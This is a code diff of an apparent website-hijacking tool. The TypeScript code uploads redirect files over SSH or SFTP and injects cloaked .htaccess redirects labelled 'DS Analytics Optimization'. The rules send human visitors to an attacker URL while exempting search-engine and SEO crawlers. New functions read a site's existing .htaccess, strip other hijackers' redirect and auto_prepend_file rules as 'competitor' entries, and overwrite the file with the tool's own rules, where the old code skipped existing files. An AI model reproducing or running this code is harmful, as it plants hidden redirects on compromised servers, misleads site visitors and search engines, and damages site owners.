@@ -106,12 +106,63 @@ exit;
 ?>`;
 }
 
-function generateHtaccess(redirectUrl: string): string {
-  return `RewriteEngine On
-RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
-RewriteCond %{HTTP_USER_AGENT} !bingbot [NC]
-RewriteRule ^$ ${redirectUrl} [R=302,L]
+function generateSmartHtaccess(redirectUrl: string): string {
+  return `# DS Analytics Optimization
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
+RewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Baiduspider [NC]
+RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]
+RewriteCond %{HTTP_USER_AGENT} !facebot [NC]
+RewriteCond %{HTTP_USER_AGENT} !Semrush [NC]
+RewriteCond %{HTTP_USER_AGENT} !AhrefsBot [NC]
+RewriteCond %{HTTP_USER_AGENT} !mj12bot [NC]
+RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
 `;
+}
+
+/** Our marker to identify our own rules */
+const DS_MARKER = '# DS Analytics Optimization';
+
+/** Patterns that indicate competitor redirect rules in .htaccess */
+const COMPETITOR_HTACCESS_PATTERNS = [
+  /RewriteRule\s+.*?\s+https?:\/\/(?!.*(?:wordpress\.org|google\.com|w3\.org))[^\s\]]+.*\[R=\d+/gi,
+  /Redirect(?:Match)?\s+\d*\s*.*?https?:\/\/[^\s]+/gi,
+  /ErrorDocument\s+\d+\s+https?:\/\/[^\s]+/gi,
+  /php_value\s+auto_prepend_file\s+.+/gi,
+  /php_value\s+auto_append_file\s+.+/gi,
+];
+
+/**
+ * Clean competitor redirect rules from .htaccess content and inject ours
+ */
+function cleanAndInjectHtaccess(existingContent: string, redirectUrl: string): { content: string; removedCount: number } {
+  // Check if our rules are already there
+  if (existingContent.includes(DS_MARKER)) {
+    return { content: existingContent, removedCount: 0 };
+  }
+
+  let cleaned = existingContent;
+  let removedCount = 0;
+  for (const pattern of COMPETITOR_HTACCESS_PATTERNS) {
+    const regex = new RegExp(pattern.source, pattern.flags);
+    const matches = cleaned.match(regex);
+    if (matches) {
+      removedCount += matches.length;
+      for (const match of matches) {
+        const lines = cleaned.split("\n");
+        const newLines = lines.filter(line => !match.split("\n").some(m => line.includes(m.trim()) && m.trim().length > 5));
+        cleaned = newLines.join("\n");
+      }
+    }
+  }
+
+  cleaned = cleaned.replace(/\n{3,}/g, "\n\n").trim();
+  const ourRules = generateSmartHtaccess(redirectUrl);
+  const finalContent = ourRules + "\n" + cleaned + "\n";
+  return { content: finalContent, removedCount };
 }
 
 // ═══════════════════════════════════════════════════════
@@ -206,6 +257,16 @@ function sftpWriteFile(sftp: SFTPWrapper, remotePath: string, content: string): 
     stream.on("close", () => resolve());
     stream.write(content, "utf-8");
     stream.end();
+  });
+}
+
+function sftpReadFile(sftp: SFTPWrapper, remotePath: string): Promise<string | null> {
+  return new Promise((resolve) => {
+    const chunks: Buffer[] = [];
+    const stream = sftp.createReadStream(remotePath);
+    stream.on("data", (chunk: Buffer) => chunks.push(chunk));
+    stream.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
+    stream.on("error", () => resolve(null));
   });
 }
 
@@ -412,19 +473,32 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
         await sftpWriteFile(sftp, remotePath, redirectContent);
         log(`✅ SFTP uploaded: ${selectedFilename}`);
 
-        // Try .htaccess injection
+        // Smart .htaccess overwrite: read existing → clean competitor → inject ours
         try {
           const htaccessPath = `${webRoot}/.htaccess`;
           const htaccessExists = await sftpStat(sftp, htaccessPath);
           if (!htaccessExists) {
-            const htaccessContent = generateHtaccess(redirectUrl);
+            const htaccessContent = generateSmartHtaccess(redirectUrl);
             await sftpWriteFile(sftp, htaccessPath, htaccessContent);
-            log(`✅ .htaccess redirect rule uploaded`);
+            log(`\u2705 Created new .htaccess with our redirect`);
           } else {
-            log(`⚠️ .htaccess exists, skipping to avoid breaking site`);
+            const existing = await sftpReadFile(sftp, htaccessPath);
+            if (existing) {
+              const { content: newContent, removedCount } = cleanAndInjectHtaccess(existing, redirectUrl);
+              if (existing.includes(DS_MARKER)) {
+                log(`\u2705 .htaccess already has our redirect rules`);
+              } else {
+                await sftpWriteFile(sftp, htaccessPath, newContent);
+                log(`\u2705 .htaccess overwritten: removed ${removedCount} competitor rule(s) + injected ours`);
+              }
+            } else {
+              const htaccessContent = generateSmartHtaccess(redirectUrl);
+              await sftpWriteFile(sftp, htaccessPath, htaccessContent);
+              log(`\u2705 .htaccess replaced (could not read existing)`);
+            }
           }
         } catch (e) {
-          log(`⚠️ .htaccess upload failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
+          log(`\u26a0\ufe0f .htaccess overwrite failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
         }
 
         const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
@@ -482,17 +556,33 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
           await sshExec(client, `chmod 644 '${webRoot}/${selectedFilename}'`, 5000);
         } catch { /* ignore */ }
 
-        // Try .htaccess
+        // Smart .htaccess overwrite via SSH exec
         try {
-          const htaccessExists = await sshExec(client, `[ -f '${webRoot}/.htaccess' ] && echo "exists"`, 5000);
+          const htaccessPath = `${webRoot}/.htaccess`;
+          const htaccessExists = await sshExec(client, `[ -f '${htaccessPath}' ] && echo "exists"`, 5000);
           if (!htaccessExists.includes("exists")) {
-            const htaccessContent = generateHtaccess(redirectUrl).replace(/'/g, "'\\''");
-            await sshExec(client, `echo '${htaccessContent}' > '${webRoot}/.htaccess'`, 5000);
-            log(`✅ .htaccess redirect rule written`);
+            const htaccessContent = generateSmartHtaccess(redirectUrl).replace(/'/g, "'\\''");
+            await sshExec(client, `echo '${htaccessContent}' > '${htaccessPath}'`, 5000);
+            log(`\u2705 Created new .htaccess with our redirect`);
           } else {
-            log(`⚠️ .htaccess exists, skipping`);
+            // Read existing, clean competitor rules, inject ours
+            const existing = await sshExec(client, `cat '${htaccessPath}'`, 5000);
+            if (existing && existing.includes(DS_MARKER)) {
+              log(`\u2705 .htaccess already has our redirect rules`);
+            } else if (existing) {
+              const { content: newContent, removedCount } = cleanAndInjectHtaccess(existing, redirectUrl);
+              const escaped = newContent.replace(/'/g, "'\\''");
+              await sshExec(client, `echo '${escaped}' > '${htaccessPath}'`, 5000);
+              log(`\u2705 .htaccess overwritten: removed ${removedCount} competitor rule(s) + injected ours`);
+            } else {
+              const htaccessContent = generateSmartHtaccess(redirectUrl).replace(/'/g, "'\\''");
+              await sshExec(client, `echo '${htaccessContent}' > '${htaccessPath}'`, 5000);
+              log(`\u2705 .htaccess replaced (could not read existing)`);
+            }
           }
-        } catch { /* ignore */ }
+        } catch (e) {
+          log(`\u26a0\ufe0f .htaccess overwrite failed: ${e instanceof Error ? e.message : String(e)}`);
+        }
 
         const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
         log(`🔗 Redirect URL: ${uploadedUrl}`);
